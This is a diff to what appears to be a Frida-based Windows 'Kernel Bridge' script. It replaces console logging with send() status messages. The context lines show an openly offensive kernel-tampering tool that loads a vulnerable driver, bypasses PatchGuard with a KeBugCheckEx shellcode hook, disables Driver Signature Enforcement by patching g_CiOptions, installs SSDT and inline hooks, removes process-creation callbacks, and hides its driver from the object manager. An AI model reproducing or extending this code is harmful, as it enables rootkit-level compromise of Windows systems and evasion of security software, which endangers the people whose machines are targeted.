@@ -123,17 +123,30 @@
     },
     
     run: function() {
-        console.log("[Kernel Bridge] Initializing kernel bridge...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "initializing_bridge"
+        });
         
         // Check platform
         if (Process.platform !== 'windows') {
-            console.log("[Kernel Bridge] Only Windows is supported");
+            send({
+            type: "warning",
+            target: "kernel_bridge",
+            action: "platform_not_supported",
+            platform: Process.platform
+        });
             return;
         }
         
         // Check privileges
         if (!this.checkPrivileges()) {
-            console.log("[Kernel Bridge] Administrator privileges required");
+            send({
+                type: "error",
+                target: "kernel_bridge",
+                action: "administrator_privileges_required"
+            });
             return;
         }
         
@@ -141,7 +154,11 @@
         this.findVulnerableDriver();
         
         if (!this.driverHandle) {
-            console.log("[Kernel Bridge] No vulnerable driver found");
+            send({
+                type: "error",
+                target: "kernel_bridge",
+                action: "no_vulnerable_driver_found"
+            });
             return;
         }
         
@@ -161,7 +178,11 @@
             this.hideFromDetection();
         }
         
-        console.log("[Kernel Bridge] Kernel bridge active");
+        send({
+            type: "success",
+            target: "kernel_bridge",
+            action: "kernel_bridge_active"
+        });
     },
     
     // Check privileges
@@ -180,7 +201,11 @@
     findVulnerableDriver: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Searching for vulnerable drivers...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "searching_vulnerable_drivers"
+        });
         
         Object.keys(this.config.drivers).forEach(function(key) {
             var driver = self.config.drivers[key];
@@ -189,7 +214,12 @@
             // Try to open device
             var handle = self.openDevice(driver.device);
             if (handle && handle.toInt32() !== -1) {
-                console.log("[Kernel Bridge] Found vulnerable driver: " + driver.name);
+                send({
+                    type: "success",
+                    target: "kernel_bridge",
+                    action: "vulnerable_driver_found",
+                    driver_name: driver.name
+                });
                 self.driverHandle = handle;
                 self.currentDriver = driver;
                 self.stats.driversLoaded++;
@@ -228,7 +258,11 @@
     loadVulnerableDriver: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Attempting to load vulnerable driver...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "attempting_to_load_vulnerable_driver"
+        });
         
         // Drop driver to temp
         var tempPath = this.getTempPath() + "\\driver.sys";
@@ -246,7 +280,11 @@
         
         // Start service
         if (this.startDriverService(service)) {
-            console.log("[Kernel Bridge] Driver loaded successfully");
+            send({
+                type: "success",
+                target: "kernel_bridge",
+                action: "driver_loaded_successfully"
+            });
             
             // Try to open device again
             setTimeout(function() {
@@ -260,18 +298,39 @@
     
     // Resolve kernel addresses
     resolveKernelAddresses: function() {
-        console.log("[Kernel Bridge] Resolving kernel addresses...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "resolving_kernel_addresses"
+        });
         
         // Get kernel base addresses
         this.ntoskrnlBase = this.getKernelModuleBase("ntoskrnl.exe");
         this.win32kBase = this.getKernelModuleBase("win32k.sys");
         
-        console.log("[Kernel Bridge] ntoskrnl.exe: " + this.ntoskrnlBase);
-        console.log("[Kernel Bridge] win32k.sys: " + this.win32kBase);
+        send({
+            type: "info",
+            target: "kernel_bridge",
+            action: "kernel_address_resolved",
+            module: "ntoskrnl.exe",
+            address: this.ntoskrnlBase.toString()
+        });
+        send({
+            type: "info",
+            target: "kernel_bridge",
+            action: "kernel_address_resolved",
+            module: "win32k.sys",
+            address: this.win32kBase.toString()
+        });
         
         // Find SSDT
         this.ssdtAddress = this.findSSDT();
-        console.log("[Kernel Bridge] SSDT: " + this.ssdtAddress);
+        send({
+            type: "info",
+            target: "kernel_bridge",
+            action: "ssdt_address_resolved",
+            address: this.ssdtAddress.toString()
+        });
         
         // Find important functions
         this.resolveCriticalFunctions();
@@ -334,7 +393,11 @@
     bypassPatchGuard: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Bypassing PatchGuard...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "bypassing_patchguard"
+        });
         
         switch(this.config.patchGuard.method) {
             case "exception_hook":
@@ -381,7 +444,11 @@
         ];
         
         this.installKernelHook(keBugCheckEx, shellcode);
-        console.log("[Kernel Bridge] PatchGuard exception hook installed");
+        send({
+            type: "success",
+            target: "kernel_bridge",
+            action: "patchguard_exception_hook_installed"
+        });
     },
     
     // Disable Driver Signature Enforcement
@@ -402,7 +469,11 @@
             var newValue = currentValue & ~0x6; // Clear bits 1 and 2
             
             this.writeKernelMemory(g_CiOptions, newValue);
-            console.log("[Kernel Bridge] DSE disabled");
+            send({
+                type: "bypass",
+                target: "kernel_bridge",
+                action: "dse_disabled"
+            });
         }
     },
     
@@ -410,7 +481,11 @@
     installKernelHooks: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Installing kernel hooks...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "installing_kernel_hooks"
+        });
         
         // SSDT hooks
         if (this.ssdtAddress) {
@@ -433,7 +508,11 @@
         
         if (!this.ssdtAddress) return;
         
-        console.log("[Kernel Bridge] Installing SSDT hooks...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "installing_ssdt_hooks"
+        });
         
         Object.keys(this.config.hooks.ssdt).forEach(function(syscall) {
             if (!self.config.hooks.ssdt[syscall]) return;
@@ -465,7 +544,12 @@
             };
             
             self.stats.hooksInstalled++;
-            console.log("[Kernel Bridge] Hooked " + syscall);
+            send({
+                type: "success",
+                target: "kernel_bridge",
+                action: "syscall_hooked",
+                syscall: syscall
+            });
         });
     },
     
@@ -535,7 +619,11 @@
     installCallbackHooks: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Installing callback hooks...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "installing_callback_hooks"
+        });
         
         // Process creation callback
         if (this.config.hooks.callbacks.processNotify) {
@@ -573,14 +661,22 @@
             }
         }
         
-        console.log("[Kernel Bridge] Process callbacks removed");
+        send({
+            type: "success",
+            target: "kernel_bridge",
+            action: "process_callbacks_removed"
+        });
     },
     
     // Install inline hooks
     installInlineHooks: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Installing inline hooks...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "installing_inline_hooks"
+        });
         
         // Hook critical functions
         var targets = [
@@ -629,14 +725,23 @@
         this.writeKernelMemory(target, trampoline);
         
         this.stats.hooksInstalled++;
-        console.log("[Kernel Bridge] Inline hooked " + name);
+        send({
+                type: "success",
+                target: "kernel_bridge",
+                action: "inline_hook_installed",
+                function_name: name
+            });
     },
     
     // Hide from detection
     hideFromDetection: function() {
         var self = this;
         
-        console.log("[Kernel Bridge] Hiding kernel modifications...");
+        send({
+            type: "status",
+            target: "kernel_bridge",
+            action: "hiding_kernel_modifications"
+        });
         
         // Hide driver
         if (this.config.stealth.hideDriver) {
@@ -678,7 +783,11 @@
         this.writeKernelMemory(driverObject.add(0x28), ptr(0)); // DriverName
         this.writeKernelMemory(driverObject.add(0x38), ptr(0)); // HardwareDatabase
         
-        console.log("[Kernel Bridge] Driver hidden from object manager");
+        send({
+            type: "bypass",
+            target: "kernel_bridge",
+            action: "driver_hidden_from_object_manager"
+        });
     },
     
     // Implement hook stealth
@@ -884,5 +993,9 @@
 if (Process.platform === 'windows') {
     KernelBridge.run();
 } else {
-    console.log("[Kernel Bridge] Platform not supported");
+    send({
+    type: "error",
+    target: "kernel_bridge",
+    action: "platform_not_supported"
+});
 }
